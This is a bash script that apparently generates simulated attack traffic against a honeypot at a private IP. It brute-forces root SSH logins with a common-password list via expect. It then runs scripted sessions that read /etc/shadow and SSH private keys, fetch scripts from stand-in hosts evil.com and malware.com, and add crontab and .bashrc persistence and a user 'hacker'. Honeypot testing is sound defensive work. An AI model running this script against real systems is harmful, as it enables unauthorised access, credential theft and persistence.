#!/bin/bash

HOST="192.168.244.133"

declare -a USERS=(
"root"
)

declare -a PASSWORDS=(
"root" "admin" "password" "123456" "12345678" "1234" "qwerty" "abc123"
"monkey" "1234567890" "letmein" "trustno1" "dragon" "master" "hello"
"login" "welcome" "ninja" "shadow" "sunshine" "princess" "passw0rd"
"password1" "password123" "admin123" "root123" "toor" "pass" "test"
"guest" "default" "changeme" "secret" "123123" "111111" "000000"
"654321" "666666" "121212" "112233" "123321" "iloveyou" "rockyou"
"P@ssw0rd" "P@ssword" "Admin@123" "Root@123" "admin@123" "qwerty123"
"raspberry" "ubuntu" "debian" "centos" "vagrant" "alpine" "oracle"
"mysql" "postgres" "redis" "mongo" "hadoop" "jenkins" "tomcat"
"summer" "winter" "spring" "autumn" "football" "baseball" "soccer"
"hockey" "basketball" "superman" "batman" "spiderman" "matrix"
"internet" "network" "server" "linux" "windows" "cisco" "router"
"switch" "firewall" "security" "access" "backup" "support" "help"
"" # empty password attempt
)

declare -a SESSIONS=(
"whoami\nid\nuname -a\nhostname\ncat /etc/passwd\ncat /etc/issue"
"ifconfig\nnetstat -a\ncat /etc/hosts\ncat /etc/resolv.conf"
"ls /\nls /home\nls /var\nls /tmp\nls /root\nls /etc"
"cat /etc/passwd\ncat /etc/shadow\ncat /proc/version\ncat /proc/cpuinfo"
"history\nenv\npwd\necho \$PATH\necho \$USER\necho \$HOME"
"wget http://evil.com/shell.sh\ncurl http://evil.com/payload.sh"
"echo 'malicious' >> ~/.bashrc\necho '* * * * * /tmp/back.sh' >> /etc/crontab"
"cd /tmp\nls -la\ncd /var/log\nls -la\ncd /home\nls -la"
"ps\nps aux\nfree\ndf\nuptime\nlast\nw\nwho"
"ls ~/.ssh\ncat ~/.ssh/authorized_keys\ncat ~/.ssh/id_rsa"
"cat /var/log/lastlog\ncat /var/log/faillog"
"adduser hacker\npasswd root"
"find /etc -name '*.conf'\nfind /tmp -type f\nfind /var -name '*.log'"
"cd /tmp\necho '#!/bin/sh' > back.sh\nchmod +x back.sh\nls -la /tmp"
"whoami\ncat /etc/shadow\nwget http://malware.com/bot.sh\nchmod +x bot.sh"
)

REPEAT=20
TOTAL=$((REPEAT * ${#SESSIONS[@]}))
COUNT=0

echo "[*] Starting attack simulation on $HOST"
echo "[*] Users available: ${#USERS[@]}"
echo "[*] Passwords available: ${#PASSWORDS[@]}"
echo "[*] $REPEAT rounds x ${#SESSIONS[@]} sessions = $TOTAL total sessions"
echo ""

for round in $(seq 1 $REPEAT); do
    echo "====== ROUND $round/$REPEAT ======"

    # Pick a random user and password for this round
    USER=${USERS[$RANDOM % ${#USERS[@]}]}
    PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
    echo "[*] Trying $USER:$PASS"

    for i in "${!SESSIONS[@]}"; do
        COUNT=$((COUNT + 1))
        echo "[*] Session $COUNT/$TOTAL..."

        CMDS=$(echo -e "${SESSIONS[$i]}")

        EXPECT_SCRIPT="#!/usr/bin/expect -f
set timeout 15
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ${USER}@${HOST}
expect \"password:\"
send \"${PASS}\r\"
expect \"#\""

        while IFS= read -r cmd; do
            EXPECT_SCRIPT+="
send \"${cmd}\r\"
expect \"#\""
        done <<< "$CMDS"

        EXPECT_SCRIPT+="
send \"exit\r\"
expect eof"

        echo "$EXPECT_SCRIPT" | expect 2>/dev/null
    done
done

echo ""
echo "[!] Done! $TOTAL sessions completed. Check your dashboard!"
